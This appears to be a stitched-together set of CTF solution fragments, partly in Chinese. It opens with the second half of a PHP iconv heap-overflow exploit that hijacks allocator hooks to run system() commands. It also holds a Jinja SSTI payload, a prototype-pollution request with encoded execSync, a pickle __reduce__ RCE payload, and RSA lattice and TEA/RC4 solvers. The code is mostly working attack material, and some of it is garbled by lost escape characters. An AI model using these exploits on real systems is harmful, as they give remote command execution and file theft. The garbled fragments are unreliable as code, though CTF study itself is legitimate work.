        libc = self._get_region(regions, "libc-", "libc.so")

        self.download_file(libc.path, LIBC_FILE)

        self.info["libc"] = ELF(LIBC_FILE, checksec=False)
        self.info["libc"].address = libc.start

    def _get_region(self, regions: list[Region], *names: str) -> Region:
        """Returns the first region whose name matches one of the given names."""
        for region in regions:
            if any(name in region.path for name in names):
                break
        else:
            failure("Unable to locate region")

        return region

    def download_file(self, remote_path: str, local_path: str) -> None:
        """Downloads `remote_path` to `local_path`"""
        data = self.get_file(remote_path)
        print(local_path)
        open(local_path, "wb").write(data)
        # f.close()
        # Path(local_path).write(data)

    def find_main_heap(self, regions: list[Region]) -> Region:
        # Any anonymous RW region with a size superior to the base heap size is a
        # candidate. The heap is at the bottom of the region.
        heaps = [
            region.stop - HEAP_SIZE + 0x40
            for region in reversed(regions)
            if region.permissions == "rw-p"
            and region.size >= HEAP_SIZE
            and region.stop & (HEAP_SIZE-1) == 0
            and region.path in ("", "[anon:
zend_alloc]")
        ]

        if not heaps:
            failure("Unable to find PHP's main heap in memory")

        first = heaps[0]

        if len(heaps) > 1:
            heaps = ", ".join(map(hex, heaps))
            msg_info(f"Potential heaps: [i]{heaps}[/] (using first)")
        else:
            msg_info(f"Using [i]{hex(first)}[/] as heap")

        return first

    def run(self) -> None:
        self.check_vulnerable()
        self.get_symbols_and_addresses()
        self.exploit()

    def build_exploit_path(self) -> str:
        """On each step of the exploit, a filter will process each chunk one after the
        other. Processing generally involves making some kind of operation either
        on the chunk or in a destination chunk of the same size. Each operation is
        applied on every single chunk; you cannot make PHP apply iconv on the first 10
        chunks and leave the rest in place. That's where the difficulties come from.

        Keep in mind that we know the address of the main heap, and the libraries.
        ASLR/PIE do not matter here.

        The idea is to use the bug to make the freelist for chunks of size 0x100 point
        lower. For instance, we have the following free list:

        ... -> 0x7fffAABBCC900 -> 0x7fffAABBCCA00 -> 0x7fffAABBCCB00

        By triggering the bug from chunk ..900, we get:

        ... -> 0x7fffAABBCCA00 -> 0x7fffAABBCCB48 -> ???

        That's step 3.

        Now, in order to control the free list, and make it point whereever we want,
        we need to have previously put a pointer at address 0x7fffAABBCCB48. To do so,
        we'd have to have allocated 0x7fffAABBCCB00 and set our pointer at offset 0x48.
        That's step 2.

        Now, if we were to perform step2 an then step3 without anything else, we'd have
        a problem: after step2 has been processed, the free list goes bottom-up, like:

        0x7fffAABBCCB00 -> 0x7fffAABBCCA00 -> 0x7fffAABBCC900

        We need to go the other way around. That's why we have step 1: it just allocates
        chunks. When they get freed, they reverse the free list. Now step2 allocates in
        reverse order, and therefore after step2, chunks are in the correct order.

        Another problem comes up.

        To trigger the overflow in step3, we convert from UTF-8 to ISO-2022-CN-EXT.
        Since step2 creates chunks that contain pointers and pointers are generally not
        UTF-8, we cannot afford to have that conversion happen on the chunks of step2.
        To avoid this, we put the chunks in step2 at the very end of the chain, and
        prefix them with `0n`. When dechunked (right before the iconv), they will
        "disappear" from the chain, preserving them from the character set conversion
        and saving us from an unwanted processing error that would stop the processing
        chain.

        After step3 we have a corrupted freelist with an arbitrary pointer into it. We
        don't know the precise layout of the heap, but we know that at the top of the
        heap resides a zend_mm_heap structure. We overwrite this structure in two ways.
        Its free_slot[] array contains a pointer to each free list. By overwriting it,
        we can make PHP allocate chunks whereever we want. In addition, its custom_heap
        field contains pointers to hook functions for emalloc, efree, and erealloc
        (similarly to malloc_hook, free_hook, etc. in the libc). We overwrite them and
        then overwrite the use_custom_heap flag to make PHP use these function pointers
        instead. We can now do our favorite CTF technique and get a call to
        system(<chunk>).
        We make sure that the "system" command kills the current process to avoid other
        system() calls with random chunk data, leading to undefined behaviour.

        The pad blocks just "pad" our allocations so that even if the heap of the
        process is in a random state, we still get contiguous, in order chunks for our
        exploit.

        Therefore, the whole process described here CANNOT crash. Everything falls
        perfectly in place, and nothing can get in the middle of our allocations.
        """

        LIBC = self.info["libc"]
        ADDR_EMALLOC = LIBC.symbols["__libc_malloc"]
        ADDR_EFREE = LIBC.symbols["__libc_system"]
        ADDR_EREALLOC = LIBC.symbols["__libc_realloc"]

        ADDR_HEAP = self.info["heap"]
        ADDR_FREE_SLOT = ADDR_HEAP + 0x20
        ADDR_CUSTOM_HEAP = ADDR_HEAP + 0x0168

        ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10

        CS = 0x100

        # Pad needs to stay at size 0x100 at every step
        pad_size = CS - 0x18
        pad = b"x00" * pad_size
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = chunked_chunk(pad, len(pad) + 6)
        pad = compressed_bucket(pad)

        step1_size = 1
        step1 = b"x00" * step1_size
        step1 = chunked_chunk(step1)
        step1 = chunked_chunk(step1)
        step1 = chunked_chunk(step1, CS)
        step1 = compressed_bucket(step1)

        # Since these chunks contain non-UTF-8 chars, we cannot let it get converted to
        # ISO-2022-CN-EXT. We add a `0n` that makes the 4th and last dechunk "crash"

        step2_size = 0x48
        step2 = b"x00" * (step2_size + 8)
        step2 = chunked_chunk(step2, CS)
        step2 = chunked_chunk(step2)
        step2 = compressed_bucket(step2)

        step2_write_ptr = b"0n".ljust(step2_size, b"x00") + p64(ADDR_FAKE_BIN)
        step2_write_ptr = chunked_chunk(step2_write_ptr, CS)
        step2_write_ptr = chunked_chunk(step2_write_ptr)
        step2_write_ptr = compressed_bucket(step2_write_ptr)

        step3_size = CS

        step3 = b"x00" * step3_size
        assert len(step3) == CS
        step3 = chunked_chunk(step3)
        step3 = chunked_chunk(step3)
        step3 = chunked_chunk(step3)
        step3 = compressed_bucket(step3)

        step3_overflow = b"x00" * (step3_size - len(BUG)) + BUG
        assert len(step3_overflow) == CS
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = chunked_chunk(step3_overflow)
        step3_overflow = compressed_bucket(step3_overflow)

        step4_size = CS
        step4 = b"=00" + b"x00" * (step4_size - 1)
        step4 = chunked_chunk(step4)
        step4 = chunked_chunk(step4)
        step4 = chunked_chunk(step4)
        step4 = compressed_bucket(step4)

        # This chunk will eventually overwrite mm_heap->free_slot
        # it is actually allocated 0x10 bytes BEFORE it, thus the two filler values
        step4_pwn = ptr_bucket(
            0x200000,
            0,
            # free_slot
            0,
            0,
            ADDR_CUSTOM_HEAP,  # 0x18
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            ADDR_HEAP,  # 0x140
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            size=CS,
        )

        step4_custom_heap = ptr_bucket(
            ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18
        )

        step4_use_custom_heap_size = 0x140

        COMMAND = self.command
        COMMAND = f"kill -9 $PPID; {COMMAND}"
        if self.sleep:
            COMMAND = f"sleep {self.sleep}; {COMMAND}"
        COMMAND = COMMAND.encode() + b"x00"

        assert (
            len(COMMAND) <= step4_use_custom_heap_size
        ), f"Command too big ({len(COMMAND)}), it must be strictly inferior to {hex(step4_use_custom_heap_size)}"
        COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b"x00")

        step4_use_custom_heap = COMMAND
        step4_use_custom_heap = qpe(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
        step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)

        pages = (
            step4 * 3
            + step4_pwn
            + step4_custom_heap
            + step4_use_custom_heap
            + step3_overflow
            + pad * self.pad
            + step1 * 3
            + step2_write_ptr
            + step2 * 2
        )

        resource = compress(compress(pages))
        resource = b64(resource)
        resource = f"data:
text/plain;base64,{resource.decode()}"

        filters = [
            # Create buckets
            "zlib.inflate",
            "zlib.inflate",
            
            # Step 0: Setup heap
            "dechunk",
            "convert.iconv.L1.L1",
            
            # Step 1: Reverse FL order
            "dechunk",
            "convert.iconv.L1.L1",
            
            # Step 2: Put fake pointer and make FL order back to normal
            "dechunk",
            "convert.iconv.L1.L1",
            
            # Step 3: Trigger overflow
            "dechunk",
            "convert.iconv.UTF-8.ISO-2022-CN-EXT",
            
            # Step 4: Allocate at arbitrary address and change zend_mm_heap
            "convert.quoted-printable-decode",
            "convert.iconv.L1.L1",
        ]
        filters = "|".join(filters)
        path = f"php://filter/read={filters}/resource={resource}"

        return path

    @inform("Triggering...")
    def exploit(self) -> None:
        path = self.build_exploit_path()
        start = time.time()

        try:
            self.remote.send(path)
        
except (ConnectionError, ChunkedEncodingError):
            pass
        
        msg_print()
        
        if not self.sleep:
            msg_print("    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]")
        elif start + self.sleep <= time.time():
            msg_print("    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]")
        else:
            # Wrong heap, maybe? If the exploited suggested others, use them!
            msg_print("    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]")
        
        msg_print()

def compress(data) -> bytes:
    """Returns data suitable for `zlib.inflate`.
    """
    # Remove 2-byte header and 4-byte checksum
    return zlib.compress(data, 9)[2:-4]

def b64(data: bytes, misalign=True) -> bytes:
    payload = base64.encode(data)
    if not misalign and payload.endswith("="):
        raise ValueError(f"Misaligned: {data}")
    return payload.encode()

def compressed_bucket(data: bytes) -> bytes:
    """Returns a chunk of size 0x8000 that, when dechunked, returns the data."""
    return chunked_chunk(data, 0x8000)

def qpe(data: bytes) -> bytes:
    """Emulates quoted-printable-encode.
    """
    return "".join(f"={x:
02x}" for x in data).upper().encode()

def ptr_bucket(*ptrs, size=None) -> bytes:
    """Creates a 0x8000 chunk that reveals pointers after every step has been ran."""
    if size is not None:
        assert len(ptrs) * 8 == size
    bucket = b"".join(map(p64, ptrs))
    bucket = qpe(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = compressed_bucket(bucket)

    return bucket

def chunked_chunk(data: bytes, size: int = None) -> bytes:
    """Constructs a chunked representation of the given chunk. If size is given, the
    chunked representation has size `size`.
    For instance, `ABCD` with size 10 becomes: `0004nABCDn`.
    """
    # The caller does not care about the size: let's just add 8, which is more than
    # enough
    if size is None:
        size = len(data) + 8
    keep = len(data) + len(b"nn")
    size = f"{len(data):x}".rjust(size - keep, "0")
    return size.encode() + b"n" + data + b"n"

@dataclass
class Region:
    """A memory region."""

    start: int
    stop: int
    permissions: str
    path: str

    @property
    def size(self) -> int:
        return self.stop - self.start

Exploit()
import time
import requests
import re

url = 'http://192.168.18.28/'

def get_expression():
try:
response = requests.get(url + 'calc')
response.raise_for_status()
expression = re.search(r'([d+-*/() .]+)', response.text)
if expression:
return expression.group(1)
else:
print("没有找到有效的计算表达式，返回页面内容：")
print(response.text)
return None
except requests.RequestException as e:
print(f"请求失败: {e}")
return None

def calculate_expression(expression):
try:
result = eval(expression)
return result
except Exception as e:
print(f"计算错误: {e}")
return None

def submit_answer(result):
try:
# params = {'answer': result,'username':"sq"}
response = requests.post(url+f"?answer={result}",data={'username':"{{g.pop.__globals__.__builtins__['__import__']('os').popen('cat${IFS}/flag').read()}}"})
response.raise_for_status()
print(f"答案提交成功，服务器回显: {response.text}")
except requests.RequestException as e:
print(f"提交答案失败: {e}")

def main():
expression = get_expression()
if expression:
print(f"获取到新的表达式: {expression}")
result = calculate_expression(expression)
if result is not None:
print(f"计算结果: {result}")
submit_answer(result)
else:
print("计算失败，跳过此次提交")

if __name__ == '__main__':
main()
POST /login HTTP/1.1
Host: 192.168.18.21
Content-Length: 495
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0
Content-Type: application/json
Accept: */*
Origin: http://192.168.18.21
Referer: http://192.168.18.21/login
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: close

{"__proto__":{"secretKey":"123",
"code":"Reflect.get(global, Reflect.ownKeys(global).find(x=&gt;x.includes(`eva`)))(Reflect.get(Object.values(Reflect.get(global, Reflect.ownKeys(global).find(x=&gt;x.startsWith(`Buf`)))),1)(`676c6f62616c2e70726f636573732e6d61696e4d6f64756c652e636f6e7374727563746f722e5f6c6f616428226368696c645f70726f6365737322292e6578656353796e632822636174202f666c61673e2e2f7075626c69632f6c6f67696e2e6a732229`,`he`.concat(`x`)).toString())"},
"username":"admin",
"password":"admin"}
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3MzExNDMzOTR9.H-ArN4DYdtJmtiTwfdWJ8foll007GeJgMuCmj4tAHkk
import pickle
import base64

def hhhhackme(pickled):

data = base64.urlsafe_b64decode(pickled)

deserialized = pickle.loads(data)nnn return '', 204"

报错回显： raise Exception得到flag

    #encoding: utf-8

import os

import pickle

import base64

class ##tttang##(##object##):

def ##__reduce__##(self):

return (##exec##,("raise Exception(__import__('os').popen('cat /flag').read())",))

a=tttang()

payload=pickle.dumps(a)

a = base64.b64encode(payload) ##print##(a)

# pickle.loads(payload)
e = [43, 37, 53, 61, 59]
c1 = [304054249108643319766233669970696347228113825299195899223597844657873869914715629219753150469421333712176994329969288126081851180518874300706117, 300569071066351295347178153438463983525013294497692191767264949606466706307039662858235919677939911290402362961043621463108147721176372907055224, 294806502799305839692215402958402593834563343055375943948669528217549597192296955202812118864208602813754722206211899285974414703769561292993531, 255660645085871679396238463457546909716172735210300668843127008526613931533718130479441396195102817055073131304413673178641069323813780056896835, 194084621856364235027333699558487834531380222896709707444060960982448111129722327145131992393643001072221754440877491070115199839112376948773978]
n = 16175064088648626038689748434699435826247716579187475966092822028609536761351820951820375552440329596553448265674841223230257463367834546091974959931391707199002842774795702094681528411058318007858638798643010942408552063479863545047616823056802010158288409527763686086960916160949496083789920012040215745627854092010308869223489833074860062054019221397227691063339148923860987250696934050122115972982286012688955816234717242567815830341836031567275888691320640526306946586793028267588302696611724356566003447616419092371914903382944112125852939011729294400479171568234647164730191643282793224422368321464125847020067
c2 = [12053085469218650692076937068797478047679005585690696222988148891925249697123080938461512785257424651119325211991331622346111396522606463631848519999574540677285771456451798811902760319940781754940936484802949729402283626052963389539032949160905330315285409948932070460455535716223838438994608837585387741418172014634472651248450564788332400265295308803291229281839428962457585593065595521459963501453576128172245723315811398209056633738967993602668795794847967331946516181453804430961308142497659799416125763566765485760600358126127595222197324155943818136202233758771243043559460620477085689770403810190118485243364, 13878717704635179949812987989626985689079485417345626168168664941124566737996226347895779823781042724620099437593856913505609774929187720381745418166924229828643565384137488017127800518133460531729559408120123922005898834268035918798610962941606864727966963354615441094676621013036726097763695675723672289505864372820096404707522755617527884121630784469379311199256277022770033036782130954108210409787680433301426480762532000133464370267551845990395683108170721952672388388178378604502610341465223041534665133155077544973384500983410220955683686526835733853985930134970899200234404716865462481142496209914197674463932]
a=pow(c1[0],e[1])-pow(c1[1],e[0])
b=pow(c1[2],e[3])-pow(c1[3],e[2])
import gmpy2
n1=gmpy2.gcd(a,b)
from Crypto.Util.number import *
b=c2[0]+c2[1]
c=c2[0]*c2[1]
R.&lt;x&gt;=Zmod(n)[]
f=x^2-b*x+c
print(f.small_roots(X=2^400))
print(long_to_bytes(n1&gt;&gt;310)+long_to_bytes(146436625375651639081292195233290471195543268962429))
    #flag{3e99c26b-efdd-4cd2-bbe5-1420eaaa3b30}
N = 61857467041120006957454494977971762866359211220721592255304580940306873708357617802596067329984189345493420858543581027612648626678588277060222860337783377316655375278359169520243355170247177279595812282793212550819124960549824278287538977769728573023023364686725321548391592858202718446127851076431000427033
e = 22696852369762746127523066296087974245933137295782964284054040654103039210164173227291367914580709029582944005335464668969366909190396194570924426653294883884186299265660358589254391341147028477295482787041170991166896788171334992065199814524969470117229229967188623636764051681654720429531708441920158042161
c = 41862679760722981662840433621129671566139143933210627878095169470855743742734397276638345217059912784871301273620533442249011607182329472311453700434692358352210197988000738272869600692181834281813995048665466937302183039555350612260646428575598237960405962714063137455677605629008760761743568236135324015278

from copy import deepcopy
# https://www.iacr.org/archive/pkc2006/39580001/39580001.pdf
# Author: ZM__________J, To1in
N = 61857467041120006957454494977971762866359211220721592255304580940306873708357617802596067329984189345493420858543581027612648626678588277060222860337783377316655375278359169520243355170247177279595812282793212550819124960549824278287538977769728573023023364686725321548391592858202718446127851076431000427033
e = 22696852369762746127523066296087974245933137295782964284054040654103039210164173227291367914580709029582944005335464668969366909190396194570924426653294883884186299265660358589254391341147028477295482787041170991166896788171334992065199814524969470117229229967188623636764051681654720429531708441920158042161
c = 41862679760722981662840433621129671566139143933210627878095169470855743742734397276638345217059912784871301273620533442249011607182329472311453700434692358352210197988000738272869600692181834281813995048665466937302183039555350612260646428575598237960405962714063137455677605629008760761743568236135324015278

alpha = log(e, N)
beta = 0.30
delta = 0.10

P.&lt;x,y,z&gt;=PolynomialRing(ZZ)

X = ceil(2 * N^(alpha + beta + delta - 1))
Y = ceil(2 * N^beta)
Z = ceil(2 * N^(1 - beta))

def f(x,y):
return x*(N-y)+N
def trans(f):
my_tuples = f.exponents(as_ETuples=False)
g = 0
for my_tuple in my_tuples:
exponent = list(my_tuple)
mon = x ^ exponent[0] * y ^ exponent[1] * z ^ exponent[2]
tmp = f.monomial_coefficient(mon)

my_minus = min(exponent[1], exponent[2])
exponent[1] -= my_minus
exponent[2] -= my_minus
tmp *= N^my_minus
tmp *= x ^ exponent[0] * y ^ exponent[1] * z ^ exponent[2]

g += tmp
return g

m = 5 # need to be adjusted according to different situations
tau = ((1 - beta)^2 - delta) / (2 * beta * (1 - beta))
sigma = (1 - beta - delta) / (2 * (1 - beta))

print(sigma * m)
print(tau * m)

s = ceil(sigma * m)
t = ceil(tau * m)
my_polynomials = []
for i in range(m+1):
for j in range(m-i+1):
g_ij = trans(e^(m-i) * x^j * z^s * f(x, y)^i)
my_polynomials.append(g_ij)

for i in range(m+1):
for j in range(1, t+1):
h_ij = trans(e^(m-i) * y^j * z^s * f(x, y)^i)
my_polynomials.append(h_ij)

known_set = set()
new_polynomials = []
my_monomials = []

# construct partial order
while len(my_polynomials) &gt; 0:
for i in range(len(my_polynomials)):
f = my_polynomials[i]
current_monomial_set = set(x^tx * y^ty * z^tz for tx, ty, tz in f.exponents(as_ETuples=False))
delta_set = current_monomial_set - known_set
if len(delta_set) == 1:
new_monomial = list(delta_set)[0]
my_monomials.append(new_monomial)
known_set |= current_monomial_set
new_polynomials.append(f)
my_polynomials.pop(i)
break
else:
raise Exception('GG')

my_polynomials = deepcopy(new_polynomials)

nrows = len(my_polynomials)
ncols = len(my_monomials)
L = [[0 for j in range(ncols)] for i in range(nrows)]

for i in range(nrows):
g_scale = my_polynomials[i](X * x, Y * y, Z * z)
for j in range(ncols):
L[i][j] = g_scale.monomial_coefficient(my_monomials[j])

# remove N^j
for i in range(nrows):
Lii = L[i][i]
N_Power = 1
while (Lii % N == 0):
N_Power *= N
Lii //= N
L[i][i] = Lii
for j in range(ncols):
if (j != i):
L[i][j] = (L[i][j] * inverse_mod(N_Power, e^m))

L = Matrix(ZZ, L)
nrows = L.nrows()

L = L.LLL()
# Recover poly
reduced_polynomials = []
for i in range(nrows):
g_l = 0
for j in range(ncols):
g_l += L[i][j] // my_monomials[j](X, Y, Z) * my_monomials[j]
reduced_polynomials.append(g_l)

# eliminate z
my_ideal_list = [y * z - N] + reduced_polynomials

# Variety
my_ideal_list = [Hi.change_ring(QQ) for Hi in my_ideal_list]
for i in range(len(my_ideal_list), 3, -1):
V = Ideal(my_ideal_list[:i]).variety(ring=ZZ)
if V:
print(V)
break

p = int(V[0]['y'])
q = N// p

d = pow(e,-1,(p-1)*(q-1))
m = pow(c,d,N)
print(bytes.fromhex(hex(m)[2:]))

# 2.14285714285714
# 4.64285714285714
# [{z: 426614979768518060635433317149972303610396098751783498586225631589479798053751568080185868568717967344782297587209012869059719479952019313461850777653567018452929932659204669967695196434044149034271037885062392902287, y: 144996003362760405215910388196517232449311004246441924325936847006315296003811348342536838359, x: 66838488369949543369599279980954380920457752396291961341704448955532596917094831390389571041281062121515985150418852560085}]
# b'flag{tlp17_1s_4w3s0m3}'
c = 11850797596095451670524864488046085367812828367468720385501401042627802035427938560866042101544712923470757782908521283827297125349504897418356898752774318846698532487439368216818306352553082800908866174488983776084101115047054799618258909847935672497139557595959270012943240666681053544905262111921321629682394432293381001209674417203517322559283298774214341100975920287314509947562597521988516473281739331823626676843441511662000240327706777269733836703945274332346982187104319993337626265180132608256601473051048047584429295402047392826197446200263357260338332947498385907066370674323324146485465822881995994908925
n = 21318014445451076173373282785176305352774631352746325570797607376133429388430074045541507180590869533728841479322829078527002230672051057531691634445544608584952008820389785877589775003311007782211153558201413379523215950193011250189319461422835303446888969202767656215090179505169679429932715040614611462819788222032915253996376941436179412296039698843901058781175173984980266474602529294294210502556931214075073722598225683528873417278644194278806584861250188304944748756498325965302770207316134309941501186831407953950259399116931502886169434888276069750811498361059787371599929532460624327554481179566565183721777
c1 = 4780454330598494796755521994676122817049316484524449315904838558624282970709853419493322324981097593808974378840031638879097938241801612033487018497098140216369858849215655128326752931937595077084912993941304190099338282258345677248403566469008681644014648936628917169410836177868780315684341713654307395687505633335014603359767330561537038768638735748918661640474253502491969012573691915259958624247097465484616897537609020908205710563729989781151998857899164730749018285034659826333237729626543828084565456402192248651439973664388584573568717209037035304656129544659938260424175198672402598017357232325892636389317
c2 = 9819969459625593669601382899520076842920503183309309803192703938113310555315820609668682700395783456748733586303741807720797250273398269491111457242928322099763695038354042594669354762377904219084248848357721789542296806917415858628166620939519882488036571575584114090978113723733730014540463867922496336721404035184980539976055043268531950537390688608145163366927155216880223837210005451630289274909202545128326823263729300705064272989684160839861214962848466991460734691634724996390718260697593087126527364129385260181297994656537605275019190025309958225118922301122440260517901900886521746387796688737094737637604

def attack(brute = 2):
for i in range(2^brute):
for j in range(2^brute):
L = Matrix(ZZ, [
[1,0,0,2^brute*c1],
[0,1,0,2^brute*c2],
[0,0,2^(1024-brute),c1*i+c2*j-c1*c2],
[0,0,0,n]
])
L[:,-1:] *= n
res = L.LLL()[0]

p = 2^brute*abs(res[0])+i
if(n % p == 0):
print(p)
assert is_prime(p)
return p
p = attack()
q = n // p
assert is_prime(q)
d = pow(0x10001,-1,(p-1)*(q-1))
m = pow(c,d,n)
print(bytes.fromhex(hex(m)[2:]))
# 171656660665403765738031081824875339142040216917035829027175959644968598469497472331153755626091317314219661980132136551775230700283513247877337805935248792200809930483659957679825478739707821552518426177878428742937912850019804844395502428151318188402429797244319960066986182724904794027618050562615218050411
# b'flag{3z_r5a_15_r34lly_345y_w1sh_u_c0uld_g3t_f14g}xcbxdfrx1fxf6Ex04 x83_Uxe5Ixefx82xdex8axe4px95R*x89.1&lt;xc2x9d[OU#x19 x0fx0eQxe9xaax83xb1xfeG8x99yB`x04xecxa9x13x85@xb1Rx97hxb4xfdxaa]pyxdfx87x08xafxf6xdafx0bx00xf2x0cxc9l8x03'
load("/home/sage/collection_lattice_tools/inequ_cvp_solve.sage")

c = 11850797596095451670524864488046085367812828367468720385501401042627802035427938560866042101544712923470757782908521283827297125349504897418356898752774318846698532487439368216818306352553082800908866174488983776084101115047054799618258909847935672497139557595959270012943240666681053544905262111921321629682394432293381001209674417203517322559283298774214341100975920287314509947562597521988516473281739331823626676843441511662000240327706777269733836703945274332346982187104319993337626265180132608256601473051048047584429295402047392826197446200263357260338332947498385907066370674323324146485465822881995994908925
n = 21318014445451076173373282785176305352774631352746325570797607376133429388430074045541507180590869533728841479322829078527002230672051057531691634445544608584952008820389785877589775003311007782211153558201413379523215950193011250189319461422835303446888969202767656215090179505169679429932715040614611462819788222032915253996376941436179412296039698843901058781175173984980266474602529294294210502556931214075073722598225683528873417278644194278806584861250188304944748756498325965302770207316134309941501186831407953950259399116931502886169434888276069750811498361059787371599929532460624327554481179566565183721777
h1 = 4780454330598494796755521994676122817049316484524449315904838558624282970709853419493322324981097593808974378840031638879097938241801612033487018497098140216369858849215655128326752931937595077084912993941304190099338282258345677248403566469008681644014648936628917169410836177868780315684341713654307395687505633335014603359767330561537038768638735748918661640474253502491969012573691915259958624247097465484616897537609020908205710563729989781151998857899164730749018285034659826333237729626543828084565456402192248651439973664388584573568717209037035304656129544659938260424175198672402598017357232325892636389317
h2 = 9819969459625593669601382899520076842920503183309309803192703938113310555315820609668682700395783456748733586303741807720797250273398269491111457242928322099763695038354042594669354762377904219084248848357721789542296806917415858628166620939519882488036571575584114090978113723733730014540463867922496336721404035184980539976055043268531950537390688608145163366927155216880223837210005451630289274909202545128326823263729300705064272989684160839861214962848466991460734691634724996390718260697593087126527364129385260181297994656537605275019190025309958225118922301122440260517901900886521746387796688737094737637604

mat = Matrix([
[n,0,0,0],
[h1*h2,1,0,0],
[-h2,0,1,0],
[-h1,0,0,1]
])

lb = [0,1,2^1023,2^1023]
ub = [0,1,2^1024,2^1024]

sol = solve(mat,lb,ub)[0]
print(sol[2:])

_,_,p,q = map(int,sol)
assert is_prime(p) and is_prime(q)

d = pow(0x10001,-1,(p-1)*(q-1))
m = pow(c,d,n)
print(bytes.fromhex(hex(m)[2:]))

# Expected Number of Solutions : 1
# (124189847121659504689131596141558047777470804493599644420296555116734410602128548952870025238352452050389498094816555251171494633173056599030097009589059426642394227134903947124256903019712657426771434047124620967038284130366066946770546558623405351933778765398347798146994796514331421532950278418230985309907, 171656660665403765738031081824875339142040216917035829027175959644968598469497472331153755626091317314219661980132136551775230700283513247877337805935248792200809930483659957679825478739707821552518426177878428742937912850019804844395502428151318188402429797244319960066986182724904794027618050562615218050411)
    #b'flag{3z_r5a_15_r34lly_345y_w1sh_u_c0uld_g3t_f14g}xcbxdfrx1fxf6Ex04 x83_Uxe5Ixefx82xdex8axe4px95R*x89.1&lt;xc2x9d[OU#x19 x0fx0eQxe9xaax83xb1xfeG8x99yB`x04xecxa9x13x85@xb1Rx97hxb4xfdxaa]pyxdfx87x08xafxf6xdafx0bx00xf2x0cxc9l8x03'
    #include <stdio.h>

    #include <stdint.h>

    #include <stdlib.h>

void encrypt(uint32_t* plainBlock, uint32_t* key) {

uint32_t leftBlock = plainBlock[0], rightBlock = plainBlock[1], roundSum = 0, roundIdx;

// 生成伪随机数序列

uint32_t roundSums[32];

for (roundIdx = 0; roundIdx < 32; roundIdx++) {

roundSums[roundIdx] = rand();

if (roundIdx > 0) {

roundSums[roundIdx] += roundSums[roundIdx - 1];

}

}

// 分解密钥

uint32_t keyPart1 = key[0], keyPart2 = key[1], keyPart3 = key[2], keyPart4 = key[3];

// 进行32轮加密

for (roundIdx = 0; roundIdx < 32; roundIdx++) {

roundSum = roundSums[roundIdx];

// 加密公式（与解密公式相反）

leftBlock += ((rightBlock << 4) + keyPart1) ^ (rightBlock + roundSum) ^ ((rightBlock >> 5) + keyPart2);

rightBlock += ((leftBlock << 4) + keyPart3) ^ (leftBlock + roundSum) ^ ((leftBlock >> 5) + keyPart4);

}

// 将加密后的数据写回

plainBlock[0] = leftBlock;

plainBlock[1] = rightBlock;

}

void decrypt(uint32_t* cipherBlock, uint32_t* key) {

uint32_t leftBlock = cipherBlock[0], rightBlock = cipherBlock[1], roundSum, roundIdx;

// 生成伪随机数序列

uint32_t roundSums[32];

for (roundIdx = 0; roundIdx < 32; roundIdx++) {

roundSums[roundIdx] = rand();

if (roundIdx > 0) {

roundSums[roundIdx] += roundSums[roundIdx - 1];

}

}

// 分解密钥

uint32_t keyPart1 = key[0], keyPart2 = key[1], keyPart3 = key[2], keyPart4 = key[3];

// 进行32轮解密

for (roundIdx = 0; roundIdx < 32; roundIdx++) {

roundSum = roundSums[31 - roundIdx];

// 解密公式

rightBlock -= ((leftBlock << 4) + keyPart3) ^ (leftBlock + roundSum) ^ ((leftBlock >> 5) + keyPart4);

leftBlock -= ((rightBlock << 4) + keyPart1) ^ (rightBlock + roundSum) ^ ((rightBlock >> 5) + keyPart2);

}

// 将解密后的数据写回

cipherBlock[0] = leftBlock;

cipherBlock[1] = rightBlock;

}

int main() {

// 初始化随机数生成器

srand(0);

// 定义数据和密钥

uint32_t cipherData[] = {0xEA2063F8, 0x8F66F252, 0x902A72EF, 0x411FDA74,

0x19590D4D, 0xCAE74317, 0x63870F3F, 0xD753AE61};

uint32_t encryptionKey[4] = {2, 2, 3, 3};

// 解密多个数据块

for (int i = 0; i < 4; i++) {

decrypt(&cipherData[i * 2], encryptionKey);

}

// 输出解密后的数据

for (int i = 0; i < 8; i++) {

printf("%08X ", cipherData[i]);

}

printf("n%s",cipherData);

return 0;

}
import base64
exp = (每次解密后的得出解密代码)#把前面的”exec(“和后面”)“删掉

# 将解码后的数据写入到一个文本文件
with open('decoded_output28.txt', 'wb') as f:
f.write(exp)

print("解密结果已经写入到 decoded_output28.txt 文件中。")
a=True
d=len
G=list
g=range
s=next
R=bytes
o=input
Y=print

def l(S):
i=0
j=0
while a:
i=(i+1)%256
j=(j+S[i])%256
S[i],S[j]=S[j],S[i]
K=S[(S[i]+S[j])%256]
yield K

def N(key,O):
I=d(key)
S=G(g(256))
j=0
for i in g(256):
j=(j+S[i]+key[i%I])%256
S[i],S[j]=S[j],S[i]
z=l(S)
n=[]
for k in O:
n.append(k^s(z)+2)
return R(n)

def E(s,parts_num):
Q=d(s.decode())
S=Q//parts_num
u=Q%parts_num
W=[]
j=0
for i in g(parts_num):
T=j+S
if u&gt;0:
T+=1
u-=1
W.append(s[j:T])
j=T
return W

if __name__=='__main__':
L=o('input the flag: &gt;&gt;&gt; ').encode()
